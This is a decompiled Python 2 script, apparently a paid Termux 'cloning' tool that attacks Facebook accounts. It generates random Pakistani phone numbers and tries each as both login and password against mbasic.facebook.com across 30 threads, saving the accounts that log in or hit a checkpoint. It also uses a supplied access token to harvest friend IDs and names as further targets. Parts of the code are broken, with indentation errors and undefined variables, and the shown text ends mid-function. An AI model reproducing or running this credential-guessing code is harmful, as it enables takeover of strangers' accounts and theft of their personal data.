# Decompile by RARE TOOL
# DECOMPILE SUCCESSFULLY
#Zeeshan Altaf
import os, time, requests, datetime, random,multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError


os.system("rm -rf .txt")
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
pass

l1="100077"
l2="100078"

os.system ('rm -rf token.txt')
g='\x1b[1;92m'
r='\x1b[1;91m'
w='\x1b[1;97m'
y='\x1b[1;93m'
n='\x1b[1;94m'
gu='\x1b[1;95m'
sm='\x1b[1;96m'

try:
    import lolcat
except:
    os.system('pip2 install lolcat')
logo = """'
\x1b[1;92m'      /$$$$$$  /$$   /$$  /$$$$$$  /$$   /$$ /$$$$$$
\x1b[1;92m /$$__  $$| $$  | $$ /$$__  $$| $$$ | $$|_  $$_/
\x1b[1;92m| $$  \__/| $$  | $$| $$  \ $$| $$$$| $$  | $$  
\x1b[1;92m|  $$$$$$ | $$$$$$$$| $$$$$$$$| $$ $$ $$  | $$  
 \x1b[1;92m\____  $$| $$__  $$| $$__  $$| $$  $$$$  | $$  
\x1b[1;92m /$$  \ $$| $$  | $$| $$  | $$| $$\  $$$  | $$  
\x1b[1;92m|  $$$$$$/| $$  | $$| $$  | $$| $$ \  $$ /$$$$$$
 \x1b[1;92m\______/ |__/  |__/|__/  |__/|__/  \__/|______/
'\x1b[1;91m'   Author      :     ZEESHAN ALTAF   
'\x1b[1;92m'   Github      :     https://github.com/SHANIUSTAD
'\x1b[1;93m'   FB ID        :     Zeeshan Altaf
'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS
'\x1b[1;96m'   WAP NUMBER  :    03118066577          
"""
dec="2"
server="2"


rsauser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header= {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent":rsauser, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
reload(sys)
sys.setdefaultencoding('utf8')



fuck=[]
idx=[]
oks=[]
cps=[]


    
    
def main_apv():
    imt="+SHANI=="
    os.system('clear')
    print logo
    try:
        key1=open("/sdcard/.android.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        print ("           You dont have subscrption")
        print("           Hello Dear Ya Cammonds Paid Han")
        print ("           But apni approval key la kr wahtsapp") 
        print ("          A jayo mein sub ko free approval don ga ")
        print ("           Bus duyaoon mein yad rakhna")
        print ("           Kush rehyen sub hanstya muskryta rehyen")
        print ("")
        myid=uuid.uuid4().hex[:10]
        print ("         YOUR KEY : "+myid+imt)
        kok=open("/sdcard/.android.txt",'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("           Ya Uper Wale Ap Ke KEY Ha")
        print ("           Copy Kar Ka WhatsApp Pa Bhaj Dena")
        print ("")
        print ("")
        print ("")
        print ("     Agar Ap Na Subscription Kar Le Ha To")
        raw_input ("    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio ")
        os.system("xdg-open https://wa.me/+923118066577")
        
r1=requests.get("https://github.com/SHANIUSTAD/SHANI_XD/main/server.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
        print logo
        print ("           You dont have subscrption")
        print("           Hello Dear Ya Cammonds Paid Han")
        print ("           But apni approval key la kr wahtsapp") 
        print ("          A jayo mein sub ko free approval don ga ")
        print ("           Bus duyaoon mein yad rakhna")
        print ("           Kush rehyen sub hanstya muskryta rehyen")
        print ("")
        print ("         YOUR KEY : "+key1)
        print ("")
        print ("           Ya Uper Wale Ap Ke KEY Ha")
        print ("           Copy Kar Ka WhatsApp Pa Bhaj Dena")
        print ("")
        print ("")
        print ("")
        print ("     Agar Ap Na Subscription Kar Le Ha To")
        raw_input ("    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio ")
         
        os.system("xdg-open https://wa.me/+923118066577")
        
        
        

def main_system():
    try:
        token=open('token.txt','r').read()
    except:
        pass
    try:
        r=requests.get('https://graph.facebook.com/me?access_token=' + token)
        q=json.loads(r.text)
        m=q['name']
        print ''
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print "Trun On Data An Then \t"
        print("")
    except:
        print ('\x1b[1;91mToken on Chekpiont ')
        os.system('rm -rf token.txt')
    os.system('clear')
    print logo
    print ""
    print 39*'~'
    print "\x1b[1;93m[1]   Public Cloning      \x1b[1;92m(Login)"
    print "\x1b[1;91m[2]   Random Cloning     \x1b[1;92m (No Login)"
    print "\x1b[1;92m[3]   File Cloning       \x1b[1;92m (No Login)"
    print "\x1b[1;93m[4]   File Making Menu\x1b[1;92m    (Login)"
    print "\x1b[1;94m[5]   Check Subscription "
    print "\x1b[1;95m[6]   Update Tools"
    print "\x1b[1;96m[7]   For Any Help Massage WhatsApp"
    print 43*'~'
    print "\x1b[1;92m[*]\x1b[1;95m For Need Any Help Type 7 And \x1b[1;92mWhatsApp Me  "
    print 43*'~'
    main_input()
def main_input():
    mx=raw_input('\x1b[1;92m[*] Select :\x1b[1;93m ')
    if mx=='1':
        print ""
        print('\033[1;94m Cheking Subscription ....\033[1;92m')
        time.sleep(3)
        fb_menu()
    elif mx=='2':
        print ""
        print('\033[1;94m Cheking Subscription ....\033[1;97m')
        time.sleep(3)
        numcloning()
    elif mx=='3':
        print ""
print ("")
        print ("")
        print ("")
        print "        [ File Cloning ]"
        print ""
        print "    [ Clone With Auto Pass Speed ]"
        print ""
        print "    [1] Cloning With Auto Pass"
        print "    [2] Cloning With Name + Pass"
        
        print "    [0] Back"
        print ""
        c=raw_input("   [*] Select : ")
        if c=='1':
            fileauto()
        elif c=='2':
            n_f_p_pass()
            
        else:
            main_system()
    elif mx=='4':
        print ""
        print('\033[1;94m Cheking Subscription ....\033[1;97m')
        time.sleep(3)
        grap()
    elif mx=='5':
    	os.system ('clear')
        print logo
        print ("")
        print ("")
        print ("")
        print ("")
        print ("\x1b[1;92m        Congratulations Bro Your Pro")
        print ("\x1b[1;92m        Member In SHANI Paid Commands ")
        print ("\x1b[1;91m        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("https://github.com/SHANIUSTAD/SHANI_XD")
        os.system("rm -rf SHANI_XD")
        os.system("cp -f SHANI_XD/SHANI_XD \\.")
        os.system("rm -rf SHANI_XD")
        os.system(" cd SHANI_XD")
        os.system(" python2 SHANI.py")
        time.sleep(5)
        xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
        time.sleep(2)
        main_system()
			
elif mx=='7':
        os.system("xdg-open https://wa.me/+923118066577")
        time.sleep(3)
        main_system()
        
        
    else:
        print ('invild option')
        time.sleep(2)
        main_system()


def numcloning():
    if dec in server:
        pass
    else:
        notf()
    ra=[]
    cps=[]
    oks=[]
    os.system ("clear")
    print logo
    print ""
    print    "    \033[1;91m\n[ Pakistan Random Number Cloning ]"
    
    print ""
    print ('\033[1;92m\n   [*] Enter First 4 Latter Of Any Network : ')
    print ("\033[1;93m\n     Example 0300  0345 0320 0303 ")
    print ""
    coc=raw_input ('\033[1;95m\nChoice Code :\033[1;93m ')
    try:
        list = '.txt'
        for li in open(list, 'r').readlines():
            ra.append(li.strip())
    except (KeyError, IOError):
        print ("File Missing")
        time.sleep (2)
        main_system()
    print ("")
    print "\033[1;93m\n[*] Total Ids : " +str(len(ra))
    print ""
    os.system('echo " ------------------------------------"| lolcat')
    print "  CRACKING START PLEASE WAIT FOR IDS..   "
    print "IF IDS NOT COMMING USE (airplane) FLIGHT MOD"
    os.system('echo " ------------------------------------"| lolcat')
    def main(arg):
        user = arg
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", 
			"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = user
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': coc+user, 'pass': pass1, 'login': 'submit'})
            
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SHANI-OK] "+coc+user + " | " + pass1
                ok=open('imtiaz random-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(cid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    
                    print "\x1b[1;91m[SHANI-CP] "+coc+user + " | " + pass1
                    cp=open('imtiaz random-cp.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(cid+pass1)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, ra)
    print "\x1b[1;97m"
    print 40*'-'
    print "[!] Cloning Complete Been Completed ........"
    print 40*'-'
    print '[!] Total Ok Ids : ' +str(len(cps))
    print '[!] Total Cp Ids : ' +str(len(oks))
    print 40*'-'
    print ''
    raw_input(' Press Enter To Back ')
    main_system()


def fb_menu():
    if dec in server:
        pass
    else:
        notf()
        
    try:
        token=open('token.txt','r').read()
    except:
        os.system('clear')
        print logo
        print 39*'-'
        print "\033[1;92m\n[1] Login With Token"
        print "\033[1;93m\n[0] Back"
        print 39*'-'
        pp=raw_input('\033[1;94m\nSelect :\033[1;91m ')
        if pp=='1':
            os.system('clear')
            print logo
            print "\033[1;91m\n[*] Enter Your Token Hear"
            print ''
            tok=raw_input('\033[1;92m\n[*]PASTE TOKEN :\033[1;97m ')
            j=open('token.txt','w')
            j.write(tok)
            j.close()
            try:
                r=requests.get('https://graph.facebook.com/me?access_token=' + tok)
                q=json.loads(r.text)
                m=q['name']
                print ''
                print ('WELCOME : '+m)
                time.sleep(2)
                fb_menu()
            except requests.exceptions.ConnectionError:
                print logo
                print ''
                print "Trun On Data An Then \t"
                print("")
            except:
                os.system ('clear')
                print ""
                print ""
                print ('\033[1;91m     Your Token Is Expire')
                time.sleep(3)
                os.system('rm -rf token.txt')
                main_system()
        else:
            main_system()
    os.system('clear')
    os.system('rm -rf file.txt')
    os.system('rm -rf newlinks.txt')
    print logo
    print   ""
    print 39*'-'
    print "\033[1;92m[1] Public Cloning Method (1)"
    print "\033[1;92m[2] Public Cloning Method (2)"
    
    print "\033[1;91m[0] Back "
    print 39*'-'
    cz=raw_input('[!] Select : ')
    if cz=="1":
        print ""
        print "\033[1;91m      [ Public Cloning Method (1) ]"
        print ""
        print " [\033[1;93m cloning with pass or name + pass ]"
        print ""
        print "\033[1;92m[1] Cloning with password"
        print "\033[1;92m[2] Cloning with name + pass"
        print "\033[1;91m[0] Back"
        print ""
        c=raw_input("[!] Select : ")
        if c=='1':
            p_p_pass()
        elif c=='2':
            n_p_pass()
        else:
            fb_menu()
    elif cz=="2":
        print ""
        print "\033[1;92m      [ Public Cloning Method (2) ]"
        print ""
        print "\033[1;92m [ cloning with pass or name + pass ]"
        print ""
        print "\033[1;92m[1] Cloning With Choice Password"
        print "\033[1;92m[2] Cloning With Name + Pass"
        print "\033[1;92m[3] Cloning With Auto Pass"
        print "\033[1;91m[0] Back"
        print ""
        vv=raw_input("\033[1;95m[!] Select :\033[1;92m ")
        if vv=="1":
            xokp()
        elif vv=="2":
            xoknp()
        elif vv=="3":
            xokpauto()
        else:
            fb_menu()
    elif cz=="v":
        os.system('clear')
        print logo
        print ""
        print ""
        print "\033[1;92m     [ File Making ]"
        print ""
        print "\033[1;91m  [ Maximum Limit 10 IDs ]"
        print ""
        c=raw_input("\033[1;93m      [*] How Many Links Do You Want To Dump : ")
        if c=='1':
            ext1()
        elif c=='2':
            ext2()
        elif c=='3':
            ext3()
        elif c=='4':
            ext4()
        elif c=='5':
            ext5()
        elif c=='6':
            ext6()
        elif c=='7':
            ext7()
        elif c=='8':
            ext8()
        elif c=='9':
            ext9()
        elif c=='10':
            ext10()
        else:
            fb_menu()
    elif cz=="4":
        mineExt()
    else:
        main_system()


def mineExt():
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print logo
    print ""
    iiid=raw_input("[=] Enter ID : ")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print sm+"[=] Extracting From : "+nid+" > \x1b[1;91mFriends"
    print ""
    time.sleep(2)
    print gu+"[=] Graping URLs ......"+w
    print ""
    time.sleep(2)
    print g+"[=] Graping Complte Process Start *"+w
    print ""
    os.system(' cat look.txt | grep "100077" >> kk.txt')
    os.system(' cat look.txt | grep "100078" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From SHANI : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print ""
    print sm+"[=] Total Extract ids : "+str(len(count))+w
    print ""
    mvt=raw_input("[=] Enter Path To Save File : ")
    print "[=] Your File Save in : "+mvt
    shutil.move(hok,mvt)
    os.system('rm -rf jok.txt')
    raw_input('[=] Press Enter To Back')
    fb_menu()





def xokpauto():
    os.system("rm -rf kk.txt")
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print logo
    print ""
    iiid=raw_input("[=] Enter ID : ")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ""
    print sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends"
    print ""
    time.sleep(2)
    print g+"[=] Transfer Complte Process Start *"+w
    print ""
    os.system(' cat look.txt | grep "100077" >> kk.txt')
    os.system(' cat look.txt | grep "100078" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
